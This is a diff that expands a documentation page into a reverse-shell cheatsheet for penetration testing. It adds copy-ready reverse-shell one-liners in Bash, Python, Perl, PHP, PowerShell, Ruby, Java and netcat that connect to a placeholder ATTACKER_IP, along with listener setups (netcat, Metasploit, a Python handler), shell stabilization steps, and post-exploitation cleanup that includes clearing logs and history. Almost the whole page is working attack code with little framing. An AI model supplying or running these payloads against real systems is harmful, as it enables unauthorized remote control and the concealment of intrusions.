@@ -1,11 +1,317 @@
 ---
 title: Reverse Shells
-description: Reverse Shells
+description: A comprehensive guide to reverse shells - types, implementations, and best practices
 icon: "ArrowRightLeft"
 ---
 
-# Reverse Shells
+import { Tab, Tabs } from 'fumadocs-ui/components/tabs';
+import { Step, Steps } from 'fumadocs-ui/components/steps';
+import { Accordion, Accordions } from 'fumadocs-ui/components/accordion';
 
-Reverse Shells
+# Reverse Shells Cheatsheet
 
-## What is Reverse Shells?
+## 1. Understanding Reverse Shells
+
+<Tabs items={["What is a Reverse Shell?", "How it Works", "Common Uses", "Security Implications"]}>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-blue-600 dark:text-blue-400">What is a Reverse Shell?</h4>
+      <p>A reverse shell is a type of shell session that is initiated from a target machine back to an attacker's machine. It:</p>
+      <ul className="list-disc pl-5 mt-2">
+        <li>Allows remote command execution</li>
+        <li>Bypasses firewall restrictions</li>
+        <li>Provides interactive access</li>
+        <li>Can be implemented in various programming languages</li>
+      </ul>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-green-600 dark:text-green-400">How it Works</h4>
+      <Steps>
+        <Step>Attacker sets up a listener on their machine</Step>
+        <Step>Target machine initiates connection back to attacker</Step>
+        <Step>Shell session is established over the connection</Step>
+        <Step>Commands are executed on target with results sent back</Step>
+      </Steps>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-purple-600 dark:text-purple-400">Common Uses</h4>
+      <ul className="list-disc pl-5">
+        <li>Penetration Testing</li>
+        <li>Security Assessments</li>
+        <li>System Administration</li>
+        <li>Remote Support</li>
+      </ul>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-red-600 dark:text-red-400">Security Implications</h4>
+      <ul className="list-disc pl-5">
+        <li>Provides full system access</li>
+        <li>Can bypass firewall rules</li>
+        <li>Often used in malware</li>
+        <li>Requires proper authorization</li>
+      </ul>
+    </div>
+  </Tab>
+</Tabs>
+
+## 2. Basic Reverse Shell Commands
+
+<Tabs items={["Bash", "Python", "Perl", "PHP"]}>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-blue-600 dark:text-blue-400">Bash Reverse Shells</h4>
+      
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">TCP Reverse Shell</h5>
+          ```bash
+          bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+          ```
+        </div>
+
+        <div>
+          <h5 className="font-bold mb-2">UDP Reverse Shell</h5>
+          ```bash
+          bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
+          ```
+        </div>
+
+        <div>
+          <h5 className="font-bold mb-2">Alternative Method</h5>
+          ```bash
+          0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-green-600 dark:text-green-400">Python Reverse Shells</h4>
+      
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Python 2.x</h5>
+          ```python
+          python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+          ```
+        </div>
+
+        <div>
+          <h5 className="font-bold mb-2">Python 3.x</h5>
+          ```python
+          python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run(["/bin/sh","-i"])'
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-purple-600 dark:text-purple-400">Perl Reverse Shells</h4>
+      
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">One-liner</h5>
+          ```perl
+          perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+          ```
+        </div>
+
+        <div>
+          <h5 className="font-bold mb-2">Alternative Method</h5>
+          ```perl
+          perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-red-600 dark:text-red-400">PHP Reverse Shells</h4>
+      
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">One-liner</h5>
+          ```php
+          php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+          ```
+        </div>
+
+        <div>
+          <h5 className="font-bold mb-2">Alternative Method</h5>
+          ```php
+          php -r '$sock=fsockopen("ATTACKER_IP",PORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+</Tabs>
+
+## 3. Advanced Implementations
+
+<Tabs items={["PowerShell", "Ruby", "Java", "Netcat"]}>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-blue-600 dark:text-blue-400">PowerShell Reverse Shells</h4>
+      ```powershell
+      powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+      ```
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-green-600 dark:text-green-400">Ruby Reverse Shells</h4>
+      ```ruby
+      ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+      ```
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-purple-600 dark:text-purple-400">Java Reverse Shells</h4>
+      ```java
+      r = Runtime.getRuntime()
+      p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+      p.waitFor()
+      ```
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-red-600 dark:text-red-400">Netcat Reverse Shells</h4>
+      
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Traditional Netcat</h5>
+          ```bash
+          nc -e /bin/sh ATTACKER_IP PORT
+          ```
+        </div>
+
+        <div>
+          <h5 className="font-bold mb-2">Netcat OpenBSD</h5>
+          ```bash
+          rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+</Tabs>
+
+## 4. Listener Setup
+
+<Tabs items={["Netcat", "Metasploit", "Custom Python"]}>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2">Netcat Listener</h4>
+      ```bash
+      # Basic listener
+      nc -lvnp PORT
+
+      # Verbose listener with IPv6 support
+      nc -6 -lvnp PORT
+      ```
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2">Metasploit Listener</h4>
+      ```bash
+      # Start msfconsole
+      use multi/handler
+      set PAYLOAD windows/meterpreter/reverse_tcp  # Example payload
+      set LHOST ATTACKER_IP
+      set LPORT PORT
+      run
+      ```
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2">Python Listener</h4>
+      ```python
+      #!/usr/bin/python3
+      import socket
+      import sys
+
+      # Create socket
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.bind(("0.0.0.0", PORT))
+      s.listen(1)
+      print("[*] Listening on port PORT")
+      conn, addr = s.accept()
+      print(f"[*] Connection from {addr[0]}")
+      while True:
+          cmd = input("$ ")
+          conn.send(cmd.encode())
+          output = conn.recv(4096).decode()
+          print(output)
+      ```
+    </div>
+  </Tab>
+</Tabs>
+
+## 5. Post-Exploitation
+
+<Tabs items={["Shell Upgrade", "Persistence", "Cleanup"]}>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2">Upgrading Shell to TTY</h4>
+      ```bash
+      # Python
+      python -c 'import pty; pty.spawn("/bin/bash")'
+
+      # Script
+      script -qc /bin/bash /dev/null
+
+      # Socat
+      socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT
+      ```
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2">Shell Stabilization</h4>
+      ```bash
+      # In reverse shell
+      $ python -c 'import pty; pty.spawn("/bin/bash")'
+      Ctrl-Z
+
+      # In local terminal
+      $ stty raw -echo
+      $ fg
+      $ reset
+      $ export SHELL=bash
+      $ export TERM=xterm-256color
+      $ stty rows 40 columns 150
+      ```
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2">Cleanup Steps</h4>
+      <Steps>
+        <Step>Clear command history</Step>
+        <Step>Remove any created files</Step>
+        <Step>Close all connections</Step>
+        <Step>Clear logs</Step>
+      </Steps>
+    </div>
+  </Tab>
+</Tabs>
+
+## Sources
+
+1. [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+2. [PentestMonkey - Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+3. [HighOn.Coffee - Reverse Shell Cheat Sheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
